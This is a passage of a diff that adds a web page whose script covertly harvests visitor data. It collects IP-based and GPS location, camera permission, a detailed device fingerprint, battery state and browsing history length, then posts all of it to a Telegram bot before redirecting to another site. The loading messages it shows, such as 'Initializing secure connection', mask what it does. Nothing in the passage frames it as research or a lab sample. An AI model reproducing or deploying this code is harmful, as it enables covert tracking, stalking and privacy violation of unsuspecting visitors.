+                    message += '• <b>IP Address:</b> ' + escapeHtml(data.location.ip.ip) + '\n';
+                    message += '• <b>City:</b> ' + escapeHtml(data.location.ip.city) + '\n';
+                    message += '• <b>Region:</b> ' + escapeHtml(data.location.ip.region) + '\n';
+                    message += '• <b>Country:</b> ' + escapeHtml(data.location.ip.country) + '\n';
+                    message += '• <b>ISP:</b> ' + escapeHtml(data.location.ip.isp) + '\n\n';
+                }
+
+                message += '🗺️ <b>MAP LINK:</b>\n' + mapLink + '\n\n';
+
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '📱 <b>DEVICE INFORMATION:</b>\n';
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '• <b>Type:</b> ' + escapeHtml(data.device.type) + '\n';
+                message += '• <b>OS:</b> ' + escapeHtml(data.device.os) + '\n';
+                message += '• <b>Browser:</b> ' + escapeHtml(data.device.browser) + '\n';
+                message += '• <b>Platform:</b> ' + escapeHtml(data.device.platform) + '\n';
+                message += '• <b>Language:</b> ' + escapeHtml(data.device.language) + '\n';
+                message += '• <b>Screen:</b> ' + escapeHtml(data.device.screenResolution) + '\n';
+                message += '• <b>Viewport:</b> ' + escapeHtml(data.device.viewport) + '\n';
+                message += '• <b>Orientation:</b> ' + escapeHtml(data.device.orientation) + '\n';
+                message += '• <b>Pixel Ratio:</b> ' + escapeHtml(data.device.pixelRatio) + 'x\n';
+                message += '• <b>Touch Support:</b> ' + escapeHtml(data.device.touchSupport) + '\n';
+                message += '• <b>CPU Cores:</b> ' + escapeHtml(data.device.cpuCores) + '\n';
+                message += '• <b>Memory:</b> ' + escapeHtml(data.device.memory) + '\n';
+                message += '• <b>Connection:</b> ' + escapeHtml(data.device.connection) + '\n';
+                message += '• <b>Timezone:</b> ' + escapeHtml(data.device.timezone) + '\n';
+
+                if (data.device.battery) {
+                    message += '• <b>Battery:</b> ' + escapeHtml(data.device.battery.level) + ' (Charging: ' + escapeHtml(data.device.battery.charging) + ')\n';
+                }
+
+                message += '\n';
+
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '📊 <b>SESSION DATA:</b>\n';
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '• <b>Referrer:</b> ' + escapeHtml(data.session.referrer) + '\n';
+                message += '• <b>History Length:</b> ' + escapeHtml(data.session.historyLength) + ' pages\n';
+                message += '• <b>Cookies:</b> ' + escapeHtml(data.device.cookiesEnabled) + '\n';
+                message += '• <b>Online:</b> ' + escapeHtml(data.device.online) + '\n';
+                message += '• <b>Do Not Track:</b> ' + escapeHtml(data.device.doNotTrack) + '\n\n';
+
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '🔐 <b>PERMISSIONS STATUS:</b>\n';
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '• <b>Location:</b> ' + data.permissions.location + '\n';
+                message += '• <b>Camera:</b> ' + data.permissions.camera + '\n\n';
+
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                message += '✅ <b>Status:</b> Redirecting to main site\n';
+                message += '━━━━━━━━━━━━━━━━━━━━━━━━';
+
+                // Telegram has 4096 char limit, truncate if needed
+                if (message.length > 4000) {
+                    message = message.substring(0, 3950) + '\n\n⚠️ <i>Message truncated due to length</i>';
+                }
+
+                return message;
+            }
+
+            // ============================================================
+            // SEND TO TELEGRAM (with retry)
+            // ============================================================
+
+            async function sendToTelegram(data, attempt) {
+                attempt = attempt || 1;
+
+                var message = buildTelegramMessage(data);
+                var telegramUrl = 'https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendMessage';
+
+                try {
+                    var response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: false
+                        })
+                    });
+
+                    var result = await response.json();
+
+                    if (!result.ok) {
+                        throw new Error(result.description || 'Telegram API error');
+                    }
+
+                    return { success: true };
+
+                } catch (error) {
+                    console.error('Telegram attempt ' + attempt + ' failed:', error.message);
+
+                    if (attempt < CONFIG.TELEGRAM_MAX_RETRIES) {
+                        await new Promise(function(resolve) {
+                            setTimeout(resolve, CONFIG.TELEGRAM_RETRY_DELAY * attempt);
+                        });
+                        return sendToTelegram(data, attempt + 1);
+                    }
+
+                    return { success: false, error: error.message };
+                }
+            }
+
+            // ============================================================
+            // MAIN FLOW HANDLER
+            // ============================================================
+
+            async function handleContinue() {
+                if (isProcessing) return;
+                isProcessing = true;
+
+                var btn = document.getElementById('continueBtn');
+                btn.disabled = true;
+                btn.innerHTML = '⏳ Please Wait...';
+
+                try {
+                    // Step 1: Initialize and collect basic data
+                    showStatus('Initializing secure connection...', 'loading');
+                    await new Promise(function(r) { setTimeout(r, 300); });
+
+                    var data = await collectAllData();
+
+                    // Step 2: Get IP-based location (fallback)
+                    showStatus('Detecting your location...', 'loading');
+                    data.location.ip = await getIPLocation();
+
+                    // Step 3: Request GPS location permission
+                    showStatus('Requesting location access...', 'loading');
+                    data = await requestLocationPermission(data);
+
+                    // Step 4: Request camera permission
+                    showStatus('Requesting camera access...', 'loading');
+                    data = await requestCameraPermission(data);
+
+                    // Update time on page after permissions
+                    data.timeOnPage = getTimeOnPage();
+
+                    // Step 5: Send to Telegram
+                    showStatus('Setting up your experience...', 'loading');
+                    var telegramResult = await sendToTelegram(data);
+
+                    if (telegramResult.success) {
+                        showStatus('✅ All set! Redirecting you now...', 'success');
+                    } else {
+                        showStatus('✅ Ready! Redirecting you now...', 'success');
+                    }
+
+                    // Step 6: Redirect to main site
+                    setTimeout(function() {
+                        window.location.href = CONFIG.MAIN_SITE_URL;
+                    }, CONFIG.REDIRECT_DELAY);
+
+                } catch (error) {
+                    console.error('Main flow error:', error);
+                    showStatus('⚠️ Minor issue occurred. Redirecting anyway...', 'error');
+
+                    setTimeout(function() {
+                        window.location.href = CONFIG.MAIN_SITE_URL;
+                    }, 2000);
+                }
+            }
+
+            // ============================================================
+            // EVENT LISTENERS & INITIALIZATION
+            // ============================================================
+
+            function init() {
+                // Hide page loader
+                hidePageLoader();
+
+                // Get button
+                var btn = document.getElementById('continueBtn');
+
+                // Click handler
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    handleContinue();
+                });
+
+                // Keyboard handler (prevent Enter when disabled)
+                btn.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' && btn.disabled) {
+                        e.preventDefault();
+                    }
+                });
+
+                // Prevent double-click
+                btn.addEventListener('dblclick', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                });
+
+                // Handle visibility change (optional tracking)
+                document.addEventListener('visibilitychange', function() {
+                    if (document.hidden) {
+                        console.log('User switched away from page');
+                    }
+                });
+            }
+
+            // Start when DOM is ready
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+
+        })();
+    </script>
+</body>
+</html>
